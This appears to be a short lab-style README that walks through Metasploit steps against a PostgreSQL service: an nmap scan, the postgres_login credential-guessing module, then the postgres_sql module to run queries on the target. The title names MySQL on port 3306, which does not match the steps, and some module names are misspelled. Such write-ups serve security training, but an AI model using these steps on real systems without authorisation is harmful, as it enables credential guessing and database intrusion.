# Prot-3306-MySQL-5.0.51a-3ubuntu5
1.nmap -sV (target ip)

![image](https://github.com/thanawut2903/Prot-3306-MySQL-5.0.51a-3ubuntu5/assets/159118913/38447462-7a3a-4bc1-8f9b-8c28848da50a)

2.msfconsole

3.msf 6 > search postgresql

![image](https://github.com/thanawut2903/Prot-3306-MySQL-5.0.51a-3ubuntu5/assets/159118913/ff711188-2823-492b-8d43-c8b2d302473c)

4.msf 6 > use auxiliary/scanner/postgres/postgres_login

5.msf 6 > show options

6.msf 6 > set RHOST (target ip)

![image](https://github.com/thanawut2903/Prot-3306-MySQL-5.0.51a-3ubuntu5/assets/159118913/ac49412b-76bd-4b2e-8749-4453aa808135)

7.msf 6 > set verbose flase

![image](https://github.com/thanawut2903/Prot-3306-MySQL-5.0.51a-3ubuntu5/assets/159118913/cc17ac38-4485-4355-bff5-1d567113ed8b)

8.msf 6 > run

![image](https://github.com/thanawut2903/Prot-3306-MySQL-5.0.51a-3ubuntu5/assets/159118913/014fbbee-5593-43d9-8cbf-09df3855cff2)


9.msf 6 > use auxiliary/admin/postges/postges_sql

10.msf 6 >show options

![image](https://github.com/thanawut2903/Prot-3306-MySQL-5.0.51a-3ubuntu5/assets/159118913/4a76c9a5-1de0-4d21-94c4-844dbf4a66ff)

11.msf 6 > run

![image](https://github.com/thanawut2903/Prot-3306-MySQL-5.0.51a-3ubuntu5/assets/159118913/24a36eb3-3d3b-4e2d-9edf-55ebeb797097)


Reference form : https://www.youtube.com/watch?v=iawadJ76dyA
